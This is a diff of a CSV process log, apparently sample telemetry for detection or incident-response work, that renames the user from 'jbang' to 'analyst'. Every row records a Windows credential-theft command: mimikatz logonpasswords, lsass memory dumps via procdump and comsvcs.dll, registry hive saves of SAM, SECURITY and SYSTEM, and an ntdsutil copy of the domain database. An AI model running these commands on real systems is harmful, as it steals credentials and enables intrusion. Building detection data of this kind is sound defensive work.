@@ -1,9 +1,9 @@
 PID,ParentPID,Image,CommandLine,StartTime,User
-6000,1100,C:\Windows\System32\cmd.exe,"cmd /c whoami /all",2026-03-15 15:00:00,jbang
-6010,6000,C:\Users\jbang\Downloads\mimikatz.exe,"mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",2026-03-15 15:01:00,jbang
-6020,6000,C:\Users\jbang\Downloads\procdump.exe,"procdump.exe -accepteula -ma lsass.exe lsass.dmp",2026-03-15 15:02:00,jbang
-6030,6000,C:\Windows\System32\reg.exe,"reg save HKLM\SAM C:\temp\sam.hive",2026-03-15 15:03:00,jbang
-6031,6000,C:\Windows\System32\reg.exe,"reg save HKLM\SECURITY C:\temp\security.hive",2026-03-15 15:03:05,jbang
-6032,6000,C:\Windows\System32\reg.exe,"reg save HKLM\SYSTEM C:\temp\system.hive",2026-03-15 15:03:10,jbang
-6040,6000,C:\Windows\System32\ntdsutil.exe,"ntdsutil ac in ntds ifm create full C:\temp",2026-03-15 15:04:00,jbang
-6050,6000,C:\Windows\System32\rundll32.exe,"rundll32 C:\windows\system32\comsvcs.dll MiniDump 688 C:\temp\lsass.dmp full",2026-03-15 15:05:00,jbang
+6000,1100,C:\Windows\System32\cmd.exe,"cmd /c whoami /all",2026-03-15 15:00:00,analyst
+6010,6000,C:\Users\analyst\Downloads\mimikatz.exe,"mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",2026-03-15 15:01:00,analyst
+6020,6000,C:\Users\analyst\Downloads\procdump.exe,"procdump.exe -accepteula -ma lsass.exe lsass.dmp",2026-03-15 15:02:00,analyst
+6030,6000,C:\Windows\System32\reg.exe,"reg save HKLM\SAM C:\temp\sam.hive",2026-03-15 15:03:00,analyst
+6031,6000,C:\Windows\System32\reg.exe,"reg save HKLM\SECURITY C:\temp\security.hive",2026-03-15 15:03:05,analyst
+6032,6000,C:\Windows\System32\reg.exe,"reg save HKLM\SYSTEM C:\temp\system.hive",2026-03-15 15:03:10,analyst
+6040,6000,C:\Windows\System32\ntdsutil.exe,"ntdsutil ac in ntds ifm create full C:\temp",2026-03-15 15:04:00,analyst
+6050,6000,C:\Windows\System32\rundll32.exe,"rundll32 C:\windows\system32\comsvcs.dll MiniDump 688 C:\temp\lsass.dmp full",2026-03-15 15:05:00,analyst
